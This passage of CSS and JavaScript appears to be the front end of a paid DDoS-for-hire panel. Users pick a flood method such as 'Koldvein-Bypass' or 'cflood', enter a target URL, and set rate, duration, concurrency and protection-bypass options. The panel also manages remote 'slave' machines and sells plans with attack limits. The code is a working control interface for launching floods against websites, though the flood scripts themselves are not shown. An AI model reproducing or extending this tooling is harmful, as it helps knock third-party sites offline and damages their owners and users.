.stat>span{display:block;color:var(--muted);font-size:10.5px}
.panel h2,.headrow h2{font-size:18.5px;margin:6px 0 16px;letter-spacing:-.02em;font-weight:700}
label{display:block;font-size:12.5px;color:var(--text-secondary);margin-bottom:16px;font-weight:500;text-align:left}
label small{color:var(--muted);font-size:10.5px}
input,select,textarea{display:block;width:100%;margin-top:8px;border:1px solid var(--panel-border);background:rgba(10,13,20,.5);color:var(--text);padding:13px 15px;border-radius:var(--radius-xs);min-width:0;outline:none;font-size:14px}
input:focus,select:focus,textarea:focus{border-color:rgba(56,189,248,.6);box-shadow:0 0 0 4px rgba(56,189,248,.15);background:rgba(10,13,20,.85)}
input[type="checkbox"]{width:auto;display:inline-block;margin:0;padding:0;accent-color:var(--accent-cyan)}
.url{display:flex;align-items:center;background:rgba(10,13,20,.5);border:1px solid var(--panel-border);border-radius:var(--radius-xs);padding:0 14px;margin-top:8px}
.url span{color:var(--muted);font-size:13px}
.url input{border:0;background:transparent;margin:0;padding:12px 6px;border-radius:0;box-shadow:none!important}
.cols{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.primary{position:relative;width:100%;padding:14px 18px;border:0;border-radius:var(--radius-sm);background:var(--accent-grad);color:#030408;font-weight:700;display:flex;align-items:center;justify-content:space-between;margin-top:6px;font-size:14px;box-shadow:0 8px 25px rgba(56,189,248,.25)}
.primary:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(56,189,248,.4)}
.primary:disabled{opacity:.5;cursor:not-allowed;transform:none;box-shadow:none}
.subtle{background:rgba(255,255,255,.04);border:1px solid var(--panel-border);color:var(--text-secondary);padding:8px 14px;border-radius:10px;font-size:12px;font-weight:600}
.subtle:hover{border-color:rgba(56,189,248,.4);color:var(--accent-cyan);background:rgba(56,189,248,.08)}
.subtle:disabled{opacity:.45;cursor:not-allowed}
.notice{background:rgba(245,158,11,.05);border:1px solid rgba(245,158,11,.2);border-left:3px solid var(--warn);padding:14px 16px;border-radius:var(--radius-xs);font-size:11.5px;color:var(--text-secondary);margin:16px 0;word-break:break-all}
.notice-label{font-size:9.5px;letter-spacing:.18em;text-transform:uppercase;color:var(--warn);font-weight:800;margin-bottom:6px}
.notice code{background:rgba(0,0,0,.5);padding:8px 12px;border-radius:8px;font-size:11.5px;color:#38bdf8;display:block;margin-top:4px;font-family:monospace;overflow-x:auto}
.err{color:var(--danger);font-size:12.5px;min-height:20px;margin-top:10px;font-weight:500}
.ok{color:var(--success);font-size:12.5px;min-height:20px;margin-top:10px;font-weight:500}
.headrow{display:flex;align-items:center;justify-content:space-between;margin:28px 0 14px}
.headrow h2{margin:0}

.flag-group{display:flex;flex-direction:column;gap:10px;margin:12px 0}
.flag-item{display:flex;align-items:center;gap:8px;margin:0;font-size:13px;cursor:pointer}
.flag-item input{width:auto;margin:0;flex-shrink:0}
.flag-item small{color:var(--muted);font-size:10.5px;font-family:ui-monospace,monospace}

.session-item{background:rgba(15,19,28,.7);border:1px solid rgba(255,255,255,.06);border-radius:16px;padding:16px 18px;margin-bottom:12px;position:relative;overflow:hidden;opacity:0;transform:translateY(-6px) scale(.99);transition:opacity .24s cubic-bezier(.4,0,.2,1),transform .24s cubic-bezier(.4,0,.2,1),border-color .2s ease}
.session-item.visible{opacity:1;transform:translateY(0) scale(1)}
.session-item.launching{border-color:rgba(56,189,248,.28)}
.session-item.running{border-color:rgba(255,255,255,.06)}
.session-item.done{border-color:rgba(34,197,94,.3)}
.session-item.failed{border-color:rgba(244,63,94,.32)}
.sess-head{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:10px}
.sess-title{font-size:13.5px;font-weight:600;color:var(--text);letter-spacing:-.01em}
.sess-chips{display:flex;gap:6px;flex-wrap:wrap;justify-content:flex-end}
.sess-chip{font-size:10px;font-weight:700;padding:3px 9px;border-radius:6px;letter-spacing:.05em;background:rgba(255,255,255,.04);color:var(--muted);white-space:nowrap;text-transform:uppercase;display:inline-flex;align-items:center;gap:5px}
.sess-chip .dot{width:5px;height:5px;border-radius:50%;background:currentColor}
.sess-chip.status-launching{background:rgba(56,189,248,.1);color:var(--accent-cyan)}
.sess-chip.status-running{background:rgba(34,197,94,.1);color:var(--success)}
.sess-chip.status-done{background:rgba(34,197,94,.1);color:var(--success)}
.sess-chip.status-failed{background:rgba(244,63,94,.1);color:var(--danger)}
.sess-chip.conc-chip{background:rgba(192,132,252,.1);color:#c084fc}
.sess-target{font-family:ui-monospace,monospace;font-size:12px;color:#a5b4cf;margin-bottom:12px;word-break:break-all;letter-spacing:-.01em}
.sess-progress{height:3px;background:rgba(255,255,255,.04);border-radius:2px;margin-bottom:10px;overflow:hidden}
.sess-progress-bar{height:100%;width:0;background:var(--accent-grad);border-radius:2px;transition:width .1s linear}
.session-item.done .sess-progress-bar{background:linear-gradient(90deg,#22c55e,#38bdf8)}
.session-item.failed .sess-progress-bar{background:linear-gradient(90deg,#f43f5e,#fb7185)}
.sess-foot{display:flex;align-items:center;justify-content:space-between;gap:12px}
.sess-time{font-family:ui-monospace,monospace;font-size:11.5px;color:var(--muted);letter-spacing:.02em}
.sess-stop{background:rgba(244,63,94,.08);border:1px solid rgba(244,63,94,.25);color:#fb7185;padding:6px 14px;border-radius:8px;font-size:11.5px;font-weight:600;letter-spacing:.02em;transition:all .15s}
.sess-stop:hover{background:rgba(244,63,94,.15)}
.sess-stop:disabled{opacity:.5;cursor:not-allowed}
.sess-chip-disabled{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);color:var(--muted);padding:6px 14px;border-radius:8px;font-size:11.5px;font-weight:500}
.sess-error{font-size:11.5px;color:#fb7185;margin-top:10px;word-break:break-word;line-height:1.5}

.user-row{display:grid;grid-template-columns:1fr auto;gap:12px;align-items:center;padding:15px 0;border-bottom:1px solid var(--panel-border)}
.user-row:last-child{border-bottom:0}
.user-row b{display:block;font-size:14px;color:var(--text);font-weight:700}
.user-row .meta{font-size:11px;color:var(--muted);margin-top:4px;font-family:monospace}
.user-row .row-actions{display:flex;gap:6px;flex-wrap:wrap}
.user-row .row-actions button{background:rgba(255,255,255,.04);border:1px solid var(--panel-border);color:var(--text-secondary);padding:7px 12px;border-radius:9px;font-size:11.5px;font-weight:600}
.user-row .row-actions button.danger{background:rgba(244,63,94,.1);border-color:rgba(244,63,94,.3);color:var(--danger)}
.bl-item{display:flex;justify-content:space-between;align-items:center;padding:13px 0;border-bottom:1px solid var(--panel-border);font-family:monospace;font-size:12px;color:var(--text-secondary)}
.bl-item:last-child{border-bottom:0}
.bl-item button{background:rgba(244,63,94,.1);border:1px solid rgba(244,63,94,.3);color:var(--danger);padding:6px 12px;border-radius:8px;font-size:11.5px}
.slave-item{display:grid;grid-template-columns:1fr auto;gap:12px;padding:15px 0;border-bottom:1px solid var(--panel-border);align-items:center}
.slave-item:last-child{border-bottom:0}
.slave-item b{display:block;font-size:14px;color:var(--text);font-weight:700}
.slave-item .meta{font-size:11px;color:var(--muted);margin-top:4px}
.slave-item .status{display:inline-block;padding:2px 8px;border-radius:10px;font-size:10px;font-weight:700;letter-spacing:.05em}
.status.ready{background:rgba(34,197,94,.15);color:var(--success);border:1px solid rgba(34,197,94,.35)}
.status.bootstrapping{background:rgba(56,189,248,.15);color:var(--accent-cyan);border:1px solid rgba(56,189,248,.35)}
.status.failed,.status.offline,.status.unhealthy{background:rgba(244,63,94,.15);color:var(--danger);border:1px solid rgba(244,63,94,.35)}
.slave-item .btns{display:flex;gap:6px;flex-wrap:wrap;justify-content:flex-end}
.slave-item button.danger{background:rgba(244,63,94,.1);border:1px solid rgba(244,63,94,.3);color:var(--danger);padding:7px 12px;border-radius:9px;font-size:11.5px;font-weight:600}
.slave-item button.update{background:rgba(56,189,248,.1);border:1px solid rgba(56,189,248,.35);color:var(--accent-cyan);padding:7px 12px;border-radius:9px;font-size:11.5px;font-weight:600}
.slave-item button.update:hover{background:rgba(56,189,248,.2)}

.tool-btn{display:flex;align-items:center;gap:14px;width:100%;background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.05);border-radius:14px;padding:14px 16px;color:var(--text);margin-bottom:8px;text-align:left;transition:all .18s}
.tool-btn:hover{background:rgba(255,255,255,.04);border-color:rgba(56,189,248,.2)}
.tool-icon{width:38px;height:38px;border-radius:10px;background:linear-gradient(135deg,rgba(56,189,248,.12),rgba(192,132,252,.08));border:1px solid rgba(56,189,248,.18);display:flex;align-items:center;justify-content:center;color:var(--accent-cyan);flex-shrink:0}
.tool-text{flex:1;text-align:left;min-width:0}
.tool-text b{display:block;font-size:13.5px;font-weight:600;color:var(--text);margin-bottom:1px;letter-spacing:-.01em}
.tool-text small{display:block;font-size:11.5px;color:var(--muted);font-weight:400}
.tool-arrow{color:var(--muted);font-size:14px;transition:transform .18s}
.tool-btn:hover .tool-arrow{color:var(--accent-cyan);transform:translateX(2px)}

#toast{position:fixed;bottom:40px;left:50%;transform:translateX(-50%);background:rgba(15,18,28,.95);color:var(--text);border:1px solid rgba(255,255,255,.12);padding:12px 22px;border-radius:14px;font-size:13px;font-weight:600;z-index:110;box-shadow:0 16px 40px rgba(0,0,0,.7)}
.tool-output{margin-top:16px;background:rgba(0,0,0,.5);border:1px solid var(--panel-border);border-radius:var(--radius-xs);padding:16px;font-family:monospace;font-size:12px;color:var(--text-secondary);min-height:60px;max-height:340px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.75}
.spinner{display:inline-block;width:13px;height:13px;border:2px solid rgba(56,189,248,.2);border-top-color:var(--accent-cyan);border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
.empty-state{color:var(--muted);font-size:13.5px;padding:28px 12px;text-align:center;border:1px dashed var(--panel-border);border-radius:var(--radius-sm);background:rgba(0,0,0,.2)}
.plan-card{background:var(--panel);border:1px solid var(--panel-border);border-radius:var(--radius);padding:24px;margin-bottom:14px;position:relative}
.plan-card::before{content:"";position:absolute;top:0;left:0;right:0;height:2px;background:var(--accent-grad)}
.plan-card .plan-tag{display:inline-block;padding:4px 11px;background:rgba(56,189,248,.1);border:1px solid rgba(56,189,248,.3);border-radius:20px;font-size:10px;font-weight:800;letter-spacing:.16em;color:var(--accent-cyan);margin-bottom:10px}
.plan-card .plan-name{font-size:22px;font-weight:800;letter-spacing:-.02em;margin-bottom:4px}
.plan-card .plan-price-row{display:flex;flex-wrap:wrap;gap:10px;align-items:baseline;margin:6px 0 14px}
.plan-card .plan-price{font-size:24px;font-weight:800;background:var(--accent-grad);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
.plan-card .plan-price.iran{background:linear-gradient(135deg,#22c55e,#38bdf8);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
.plan-card ul{list-style:none;padding:0;margin:0 0 16px}
.plan-card ul li{padding:7px 0;font-size:13px;color:var(--text-secondary)}
.plan-card ul li::before{content:"✓";color:var(--success);font-weight:700;margin-right:9px}
.plan-card .buy-row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.plan-card .buy-btn{padding:13px;border-radius:12px;background:var(--accent-grad);color:#030408;font-weight:700;font-size:13px;border:0}
.plan-card .buy-btn.iran{background:linear-gradient(135deg,#22c55e,#16a34a);color:#fff}
.plan-card .buy-btn:disabled{opacity:.5}
.order-row{padding:14px 0;border-bottom:1px solid var(--panel-border);font-size:13px;display:flex;justify-content:space-between;align-items:center;gap:10px}
.order-row:last-child{border-bottom:0}
.order-row .order-meta{font-size:11px;color:var(--muted);margin-top:3px}
.order-status{padding:3px 10px;border-radius:20px;font-size:10px;font-weight:700}
.order-status.pending{background:rgba(245,158,11,.15);color:var(--warn);border:1px solid rgba(245,158,11,.35)}
.order-status.paid{background:rgba(56,189,248,.15);color:var(--accent-cyan);border:1px solid rgba(56,189,248,.35)}
.order-status.delivered{background:rgba(34,197,94,.15);color:var(--success);border:1px solid rgba(34,197,94,.35)}
.order-status.error{background:rgba(244,63,94,.15);color:var(--danger);border:1px solid rgba(244,63,94,.35)}
.order-status.cancelled{background:rgba(148,163,184,.15);color:#94a3b8;border:1px solid rgba(148,163,184,.35)}
.pending-banner{display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap;background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.35);border-left:4px solid var(--warn);border-radius:var(--radius-xs);padding:12px 14px;margin-bottom:14px;font-size:12.5px}
.pending-banner button{background:rgba(244,63,94,.12);border:1px solid rgba(244,63,94,.4);color:#fb7185;padding:8px 14px;border-radius:10px;font-size:12px;font-weight:700}
.pending-banner button.pb-open{background:rgba(56,189,248,.12);border-color:rgba(56,189,248,.4);color:var(--accent-cyan)}
#planOrder.rtl{direction:rtl;text-align:right}
#planOrder.rtl #planOrderStepsList{margin:6px 18px 0 0}
@media (max-width:560px){main{margin-top:18px}}
@media (max-width:420px){main{width:100%;margin:12px auto 80px;padding:0 12px}.panel{padding:18px;border-radius:16px}.stats{grid-template-columns:1fr}.cols{grid-template-columns:1fr}.plan-card .buy-row{grid-template-columns:1fr}.sess-chips{flex-wrap:wrap}}
`;

const UI_JS = String.raw`(function(){
'use strict';
try{if(window.Telegram&&window.Telegram.WebApp){var tg=window.Telegram.WebApp;tg.ready();tg.expand();if(tg.disableVerticalSwipes)tg.disableVerticalSwipes();}}catch(e){}
var $=function(s){return document.querySelector(s);};
var $$=function(s){return document.querySelectorAll(s);};
var currentUser=null,activeSessions=[],cooldownRemaining=0;
var sessionClientStart={};
var cardCache={};
var currentGroups={};
var terminatingBatches=new Set();
var availableMethods=[];
var loginSection=$('#login'),hubSection=$('#hub'),settingsSection=$('#settings'),toolsSection=$('#tools'),registerSection=$('#register'),plansSection=$('#plans');
var adminPanel=$('#admin'),adminBlacklist=$('#adminBlacklist'),adminGlobalLimits=$('#adminGlobalLimits'),adminSlaves=$('#adminSlaves');
var sidebar=$('#sidebar'),sidebarBackdrop=$('#sidebarBackdrop');

function showToast(m){var t=$('#toast');t.textContent=m;t.classList.remove('hide');clearTimeout(t._t);t._t=setTimeout(function(){t.classList.add('hide');},4000);}
function esc(s){return String(s==null?'':s).replace(/[&<>"']/g,function(c){return{'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];});}
function lim(v){return(v===0||v===undefined||v===null)?'∞':String(v);}

async function api(p,o){o=o||{};var r=await fetch(p,Object.assign({headers:{'Content-Type':'application/json'},credentials:'same-origin'},o));var d={};try{d=await r.json();}catch(e){}if(!r.ok){var err=new Error(d.error||('HTTP '+r.status));if(d.cooldownRemaining!==undefined)err.cooldownRemaining=d.cooldownRemaining;if(d.retryAfterMs!==undefined)err.retryAfterMs=d.retryAfterMs;if(d.code)err.code=d.code;if(d.pendingOrder)err.pendingOrder=d.pendingOrder;if(d.runningSessions)err.runningSessions=d.runningSessions;if(r.status===401){currentUser=null;updateAuth();setPage('login');}throw err;}return d;}

function openSidebar(){sidebar.classList.add('open');sidebarBackdrop.classList.remove('hide');}
function closeSidebar(){sidebar.classList.remove('open');sidebarBackdrop.classList.add('hide');}
function closeSidebarOnMobile(){if(window.innerWidth<=900)closeSidebar();}

function setPage(page){
  var isAdmin=currentUser&&currentUser.role==='admin';
  if((page==='settings'||page==='tools')&&!currentUser){showToast('Sign in required.');page='login';}
  [loginSection,hubSection,settingsSection,toolsSection,registerSection,plansSection].forEach(function(s){s.classList.add('hide');});
  if(page==='hub'){hubSection.classList.remove('hide');loadSessions();}
  else if(page==='plans'){plansSection.classList.remove('hide');loadPlans();if(currentUser){loadOrderHistory();loadPendingOrder();}}
  else if(page==='settings'){settingsSection.classList.remove('hide');}
  else if(page==='tools'){toolsSection.classList.remove('hide');}
  else if(page==='login'){loginSection.classList.remove('hide');loadCaptcha('login');}
  else if(page==='register'){registerSection.classList.remove('hide');loadCaptcha('register');}
  $$('#sidebar button[data-page]').forEach(function(b){b.classList.toggle('active',b.dataset.page===page);});
  closeSidebarOnMobile();
  if(page==='settings'&&isAdmin){
    adminPanel.classList.remove('hide');adminBlacklist.classList.remove('hide');
    adminGlobalLimits.classList.remove('hide');adminSlaves.classList.remove('hide');
    loadUsers();loadBlacklist();loadGlobalLimits();loadSlaves();
  }else{
    adminPanel.classList.add('hide');adminBlacklist.classList.add('hide');
    adminGlobalLimits.classList.add('hide');adminSlaves.classList.add('hide');
  }
}

function updateAuth(){
  var lo=!!currentUser;
  $('#navLogin').classList.toggle('hide',lo);
  $('#navRegister').classList.toggle('hide',lo);
  $('#navLogout').classList.toggle('hide',!lo);
}

function updateRole(){
  var r=$('#role'),l=$('#limitsLine');
  if(!currentUser){r.textContent='Guest';l.textContent='Sign in to deploy';return;}
  if(currentUser.role==='admin'){r.textContent='Admin';l.innerHTML='<span style="font-size:10px;">Unlimited rate · unlimited sessions</span>';return;}
  if(currentUser.role==='pending'){r.textContent='Free Plan';l.textContent='Buy a plan to deploy';return;}
  r.textContent=currentUser.planName||'No Plan';
  var e=currentUser.effectiveLimits||{};
  var days=currentUser.planDaysRemaining||0;
  l.innerHTML='<span style="font-size:10px;">'+days+'d left · Rate ≤ '+lim(e.maxRate)+' · '+lim(e.maxConcurrent)+' sessions</span>';
}

async function checkAuth(){
  try{var d=await api('/api/me');currentUser=d.user;}catch(e){currentUser=null;}
  updateAuth();updateRole();
  if(currentUser){applyLimits();}
  return currentUser;
}

function applyLimits(){
  if(!currentUser)return;
  var e=currentUser.effectiveLimits||{};
  var r=$('#rateInput'),d=$('#durationInput'),c=$('#concurrentInput');
  if(currentUser.role==='admin'){
    c.removeAttribute('max');
    return;
  }
  if(e.maxRate>0){r.max=e.maxRate;if(Number(r.value)>e.maxRate)r.value=e.maxRate;}
  else{r.removeAttribute('max');}
  if(e.maxDuration>0){d.max=e.maxDuration;if(Number(d.value)>e.maxDuration)d.value=e.maxDuration;}
  else{d.removeAttribute('max');}
  if(e.maxConcurrent>0){c.max=e.maxConcurrent;if(Number(c.value)>e.maxConcurrent)c.value=e.maxConcurrent;}
  else{c.removeAttribute('max');}
}

async function loadCaptcha(which){
  which=which||'register';
  var el=which==='login'?$('#loginCaptchaQuestion'):$('#captchaQuestion');
  el.textContent='…';
  try{var d=await api('/api/captcha');el.textContent=d.question+' = ?';}catch(e){el.textContent='Error';}
}

async function loadMethods(){
  var sel=$('#methodSelect');
  var hint=$('#methodHint');
  if(!sel)return;
  try{
    var d=await api('/api/methods');
    availableMethods=d.methods||[];
    var scriptDir=d.scriptDir||'';

    if(!availableMethods.length){
      sel.innerHTML='<option value="">No methods configured</option>';
      if(hint)hint.textContent='Server returned empty methods list. Check hub logs.';
      return;
    }

    var anyAvailable=availableMethods.some(function(m){return m.available;});
    var opts=availableMethods.map(function(m){
      if(m.available){
        return '<option value="'+esc(m.id)+'">'+esc(m.name)+'</option>';
      }
      return '<option value="'+esc(m.id)+'" disabled>'+esc(m.name)+' (unavailable — '+esc(m.file)+' missing)</option>';
    });

    if(!anyAvailable){
      /* no available methods: show them all but select nothing, warn */
      opts.unshift('<option value="">— no method files found on hub —</option>');
    }

    sel.innerHTML=opts.join('');

    var firstAvail=availableMethods.find(function(m){return m.available;});
    if(firstAvail){
      sel.value=firstAvail.id;
    }

    if(hint){
      if(anyAvailable){
        hint.textContent='Files checked in: ' + scriptDir;
      }else{
        var missing=availableMethods.filter(function(m){return !m.available;}).map(function(m){return m.file;}).join(', ');
        hint.textContent='No method files found. Place ' + missing + ' next to hub.js and click Sync, or use the Update button on each slave.';
        showToast('No method files found on hub');
      }
    }

    updateMethodFields();
  }catch(e){
    console.error('[loadMethods] failed:', e);
    /* fall back: leave whatever the server-rendered HTML had, but hint at the error */
    if(hint)hint.textContent='Could not load methods: ' + e.message;
    showToast('Method load failed: ' + e.message);
  }
}

function updateMethodFields(){
  var sel=$('#methodSelect');
  if(!sel)return;
  var m=sel.value;
  var koldveinGroup=$('#flagsKoldvein');
  var cfloodGroup=$('#flagsCflood');
  if(koldveinGroup)koldveinGroup.classList.toggle('hide',m!=='koldvein');
  if(cfloodGroup)cfloodGroup.classList.toggle('hide',m!=='cflood');
}

async function loadSessions(){
  if(!currentUser){
    activeSessions=[];
    Object.keys(cardCache).forEach(function(id){delete cardCache[id];delete sessionClientStart[id];});
    currentGroups={};
    terminatingBatches.clear();
    $('#slotLine').textContent='—';
    $('#slotDetail').textContent='sign in';
    $('#sessions').innerHTML='<div class="empty-state">Sign in to deploy.</div>';
    cooldownRemaining=0;renderCooldown();
    return;
  }
  try{
    var d=await api('/api/sessions');
    activeSessions=d.sessions||[];
    cooldownRemaining=d.cooldownRemaining||0;
    renderCooldown();
    var s=d.slots||{};
    var total=s.total||0, avail=s.available||0;
    $('#slotLine').textContent=avail+'/'+total;
    $('#slotDetail').textContent=(avail===1?'slot available':'slots available');
    syncSessions();
  }catch(e){}
}

function renderCooldown(){
  var w=$('#cooldownNotice'),t=$('#cooldownText'),b=$('#startBtn');
  if(cooldownRemaining>0){
    w.classList.remove('hide');
    t.textContent='Cooldown — wait '+cooldownRemaining+'s';
    b.disabled=true;
  }else{
    w.classList.add('hide');
    b.disabled=false;
  }
}
setInterval(function(){if(cooldownRemaining>0){cooldownRemaining=Math.max(0,cooldownRemaining-1);renderCooldown();}},1000);

function statusClass(s){return s==='done'?'done':(s==='failed'?'failed':(s==='launching'?'launching':'running'));}
function statusText(s){return s==='launching'?'Launching':(s==='done'?'Complete':(s==='failed'?'Failed':'Running'));}

function groupState(sessions){
  if(sessions.every(function(s){return s.status==='done';}))return 'done';
  if(sessions.every(function(s){return s.status==='failed';}))return 'failed';
  if(sessions.some(function(s){return s.status==='running';}))return 'running';
  if(sessions.some(function(s){return s.status==='launching';}))return 'launching';
  return 'running';
}

function buildCard(gid,sessions,state){
  var first=sessions[0];
  var count=sessions.length;
  var cls=statusClass(state);
  var label=statusText(state);
  var concChip=(count>1)?'<span class="sess-chip conc-chip">CONC '+count+'</span>':'';
  var elapsed=0;
  if(state==='running'){
    var start=sessionClientStart[gid]||Date.now();
    elapsed=Math.max(0,Math.floor((Date.now()-start)/1000));
    if(elapsed>first.duration)elapsed=first.duration;
  }
  if(state==='done')elapsed=first.duration;
  var pct=(state==='done')?100:Math.min(100,Math.round((elapsed/first.duration)*100));
  var timeText=(state==='launching')?'Launching…':(elapsed+'s / '+first.duration+'s');
  var me=currentUser&&currentUser.username;
  var isAdmin=currentUser&&currentUser.role==='admin';
  var actionHtml='';
  if(state==='done'){
    actionHtml='<button class="sess-chip-disabled" disabled>Complete</button>';
  }else if(state==='failed'){
    actionHtml='<button class="sess-chip-disabled" disabled>Failed</button>';
  }else if(isAdmin||first.owner===me){
    actionHtml='<button class="sess-stop" data-gid="'+gid+'" type="button">Terminate</button>';
  }else{
    actionHtml='<button class="sess-chip-disabled" disabled>Owned by '+esc(first.owner)+'</button>';
  }
  var anyError=sessions.find(function(s){return s.error;});
  var errHtml=(state==='failed'&&anyError)?'<div class="sess-error">'+esc(anyError.error)+'</div>':'';
  var methodName=first.methodName||'Koldvein-Bypass';
  var el=document.createElement('div');
  el.className='session-item '+cls;
  el.dataset.gid=gid;
  el.dataset.state=state;
  el.dataset.duration=first.duration;
  el.dataset.count=String(count);
  el.innerHTML=
    '<div class="sess-head">'
    +'<div class="sess-title">'+esc(methodName)+'</div>'
    +'<div class="sess-chips">'
    +'<span class="sess-chip status-'+cls+'"><span class="dot"></span>'+label+'</span>'
    +concChip
    +'<span class="sess-chip">RATE '+first.rate+'</span>'
    +'</div></div>'
    +'<div class="sess-target">'+esc(first.target)+'</div>'
    +'<div class="sess-progress"><div class="sess-progress-bar" style="width:'+pct+'%"></div></div>'
    +'<div class="sess-foot">'
    +'<span class="sess-time">'+esc(timeText)+'</span>'
    +actionHtml
    +'</div>'
    +errHtml;
  return el;
}

function removeCard(gid){
  var el=cardCache[gid];
  if(!el||!el.parentNode){
    delete cardCache[gid];
    delete sessionClientStart[gid];
    return;
  }
  var h=el.offsetHeight;
  el.style.maxHeight=h+'px';
  el.style.overflow='hidden';
  el.style.transition='opacity .22s cubic-bezier(.4,0,.2,1), transform .22s cubic-bezier(.4,0,.2,1), max-height .3s cubic-bezier(.4,0,.2,1), margin-bottom .3s cubic-bezier(.4,0,.2,1), padding-top .3s cubic-bezier(.4,0,.2,1), padding-bottom .3s cubic-bezier(.4,0,.2,1)';
  void el.offsetHeight;
  requestAnimationFrame(function(){
    el.style.opacity='0';
    el.style.transform='translateY(-4px) scale(.97)';
    el.style.maxHeight='0px';
    el.style.marginBottom='0px';
    el.style.paddingTop='0px';
    el.style.paddingBottom='0px';
  });
  setTimeout(function(){
    if(el.parentNode)el.parentNode.removeChild(el);
    delete cardCache[gid];
    delete sessionClientStart[gid];
    ensureEmptyState();
  },360);
}

function bindCardButtons(el){
  var stopBtn=el.querySelector('[data-gid]');
  if(!stopBtn)return;
  var gid=el.dataset.gid;
  stopBtn.addEventListener('click',function(){terminateBatch(gid,stopBtn);});
}

async function terminateBatch(gid,btn){
  btn.disabled=true;btn.textContent='Stopping';
  terminatingBatches.add(gid);
  var sessions=(currentGroups[gid]||[]).filter(function(s){return s.status==='running'||s.status==='launching';});
  if(!sessions.length){
    terminatingBatches.delete(gid);
    btn.disabled=false;btn.textContent='Terminate';
    return;
  }
  var results;
  try{
    results=await Promise.allSettled(sessions.map(function(s){
      return api('/api/sessions/'+s.id,{method:'DELETE'});
    }));
  }catch(e){
    results=[];
  }
  var anyOk=results.some(function(r){return r.status==='fulfilled';});
  if(!anyOk){
    showToast('Failed to terminate');
    terminatingBatches.delete(gid);
    btn.disabled=false;btn.textContent='Terminate';
    return;
  }
  showToast('Terminating…');
  removeCard(gid);
  setTimeout(function(){terminatingBatches.delete(gid);},3500);
  setTimeout(loadSessions,600);
}

function ensureEmptyState(){
  var c=$('#sessions');
  if(!c)return;
  var active=c.querySelectorAll('.session-item').length;
  var empty=c.querySelector('.empty-state');
  if(active===0&&!empty){
    var e=document.createElement('div');
    e.className='empty-state';
    e.textContent='No live sessions. Deploy above to begin.';
    c.appendChild(e);
  }else if(active>0&&empty){
    empty.remove();
  }
}

function groupSignature(s){
  if(s.batchId)return 'b:'+s.batchId;
  var bucket=Math.floor((s.startedAt||0)/30000);
  return 'f:'+s.owner+'|'+(s.method||'koldvein')+'|'+s.target+'|'+s.rate+'|'+s.duration+'|'+(s.bypass?'1':'0')+(s.cookies?'1':'0')+'|'+bucket;
}

function syncSessions(){
  var container=$('#sessions');
  if(!container)return;
  var groups={};
  activeSessions.forEach(function(s){
    var key=groupSignature(s);
    if(!groups[key])groups[key]=[];
    groups[key].push(s);
  });
  currentGroups=groups;

  Object.keys(cardCache).forEach(function(gid){
    if(!groups[gid]&&!terminatingBatches.has(gid)){
      removeCard(gid);
    }
  });

  Object.keys(groups).forEach(function(gid){
    if(terminatingBatches.has(gid))return;
    var sessions=groups[gid];
    var state=groupState(sessions);

    if(state==='running'&&!sessionClientStart[gid]){
      var earliest=Math.min.apply(null,sessions.map(function(s){return s.elapsedSeconds||0;}));
      sessionClientStart[gid]=Date.now()-earliest*1000;
    }

    var existing=cardCache[gid];
    if(existing&&existing.parentNode){
      if(existing.dataset.state!==state||existing.dataset.count!==String(sessions.length)){
        var newEl=buildCard(gid,sessions,state);
        newEl.classList.add('visible');
        existing.parentNode.replaceChild(newEl,existing);
        cardCache[gid]=newEl;
        bindCardButtons(newEl);
      }
    }else{
      var newCard=buildCard(gid,sessions,state);
      var ref=container.querySelector('.session-item, .empty-state');
      if(ref){container.insertBefore(newCard,ref);}else{container.appendChild(newCard);}
      cardCache[gid]=newCard;
      bindCardButtons(newCard);
      requestAnimationFrame(function(){newCard.classList.add('visible');});
    }
  });

  ensureEmptyState();
}

setInterval(function(){
  var now=Date.now();
  var cards=document.querySelectorAll('.session-item');
  for(var i=0;i<cards.length;i++){
    var el=cards[i];
    var state=el.dataset.state;
    if(state==='launching'||state==='failed'||state==='done')continue;
    var gid=el.dataset.gid;
    var started=sessionClientStart[gid];
    if(!started)continue;
    var dur=Number(el.dataset.duration)||1;
    var elapsed=Math.floor((now-started)/1000);
    if(elapsed<0)elapsed=0;
    if(elapsed>dur)elapsed=dur;
    var time=el.querySelector('.sess-time');
    var prog=el.querySelector('.sess-progress-bar');
    if(time)time.textContent=elapsed+'s / '+dur+'s';
    if(prog)prog.style.width=Math.min(100,(elapsed/dur)*100)+'%';
  }
},100);

async function startProcess(e){
  e.preventDefault();
  var err=$('#launchErr');err.textContent='';
  if(!currentUser){showToast('Sign in first');return;}
  if(currentUser.role==='pending'){showToast('Buy a plan to deploy');return;}
  if(cooldownRemaining>0){showToast('Cooldown '+cooldownRemaining+'s');return;}
  var method=$('#methodSelect').value;
  if(!method){err.textContent='Select a method.';return;}
  var methodInfo=availableMethods.find(function(m){return m.id===method;});
  if(methodInfo&&!methodInfo.available){
    err.textContent=methodInfo.reason||'Method unavailable.';
    showToast('Method unavailable — add ' + (methodInfo.file||'file') + ' next to hub.js and click Sync.');
    return;
  }
  var t=($('#targetInput').value||'').trim();
  if(!t){err.textContent='Target required.';return;}
  if(!/^https?:\/\//i.test(t))t='https://'+t;
  var d=Number($('#durationInput').value);
  if(!d||d<1){err.textContent='Duration must be ≥1.';return;}
  var r=Number($('#rateInput').value);
  if(!r||r<1){err.textContent='Rate must be ≥1.';return;}
  var c=Number($('#concurrentInput').value)||1;
  if(!Number.isInteger(c)||c<1){err.textContent='Concurrent must be ≥1.';return;}

  var payload={
    method: method,
    target: t, duration: d, rate: r, concurrent: c,
    bypass: $('#bypassInput').checked,
    cookies: method==='cflood' ? $('#cfloodCookiesInput').checked : $('#cookiesInput').checked,
    headers: method==='cflood' ? $('#cfloodHeadersInput').checked : false,
